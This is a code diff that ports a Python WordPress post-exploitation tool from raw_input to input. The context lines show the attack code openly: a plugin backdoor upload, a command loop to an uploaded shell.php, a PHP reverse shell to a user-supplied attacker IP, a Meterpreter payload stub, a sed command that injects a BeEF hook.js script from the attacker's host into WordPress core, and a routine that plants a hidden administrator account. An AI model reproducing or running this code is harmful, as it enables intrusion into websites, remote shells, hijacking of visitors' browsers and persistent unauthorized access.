@@ -68,7 +68,7 @@ def uploadbackdoor(host,username,password,type,verbose, agent):
 
 def commandloop(host,uploaddir):
     while True:
-        cmd = raw_input('os-shell> ')
+        cmd = input('os-shell> ')
         params = [('cmd', cmd.encode('base64'))]
         if (cmd == "quit") or (cmd == "exit"):
             sys.exit(2)
@@ -149,8 +149,8 @@ def credextract(list, key):
 
 def shell(host,uploaddir):
     if safety(host, uploaddir):
-        ip = raw_input('IP Address: ')
-        port = raw_input('Port: ')
+        ip = input('IP Address: ')
+        port = input('Port: ')
         params = [('cmd', ('php -r \'$sock=fsockopen("' + ip + '",' + port + ');exec("/bin/bash -i <&3 >&3 2>&3");\'').encode('base64'))]
         try:
             print("Sending reverse shell to " + ip + " port " + port)
@@ -195,7 +195,7 @@ def stealth(host,uploaddir):
 
 
 def warning():
-    cmd = raw_input('This module modifies files within the WordPress core.  Would you like to continue? (Y/n) ')
+    cmd = input('This module modifies files within the WordPress core.  Would you like to continue? (Y/n) ')
     if ("y" in cmd) or("Y" in cmd):
         return True
     else:
@@ -204,8 +204,8 @@ def warning():
 
 def meterpreter(host,uploaddir):
     if safety(host, uploaddir):
-        ip = raw_input('IP Address: ')
-        port = raw_input('Port: ')
+        ip = input('IP Address: ')
+        port = input('Port: ')
         meter = '''<?php
     error_reporting(0);
     $ip   = '%s';
@@ -343,7 +343,7 @@ $conn->close();
 
 def beefhook(host,uploaddir):
     if warning():
-        ip = raw_input('IP Address: ')
+        ip = input('IP Address: ')
         params = [
             ('cmd',('sed -i \'1i\<script src=\"http://' + ip + ':3000/hook.js\"\>\</script\>\'  ../../../wp-blog-header.php').encode('base64'))]
         sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
@@ -351,9 +351,9 @@ def beefhook(host,uploaddir):
 
 def persist(host,uploaddir):
     if safety(host, uploaddir):
-        username = raw_input('Username: ')
-        email = raw_input('Email: ')
-        password = raw_input('Password: ')
+        username = input('Username: ')
+        email = input('Email: ')
+        password = input('Password: ')
         evilcode = '''
         $new_user = '%s';
         $new_user_email = '%s';
